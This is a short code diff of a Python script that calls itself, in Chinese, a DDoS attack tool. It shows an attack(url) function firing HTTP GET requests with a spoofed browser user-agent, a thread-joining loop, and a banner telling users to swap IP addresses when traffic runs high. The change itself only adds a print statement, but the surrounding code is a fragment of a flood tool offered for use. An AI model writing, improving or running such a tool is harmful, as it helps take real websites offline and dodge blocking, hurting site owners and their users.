@@ -10,6 +10,7 @@ def attack(url):
             response = requests.get(url, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
             print('状态码:', response.status_code)
     except requests.exceptions.RequestException as e:
+        print('访问失败:', e)
         print('请求异常:', e)
 
 def main():
@@ -32,6 +33,7 @@ def main():
     
     for t in threads:
         t.join()
+
 if '__main__' == __name__:
     print('欢迎使用DDOS攻击工具')
     print('使用前要检查站状态，如涉及到过大量访问，及时替换IP')
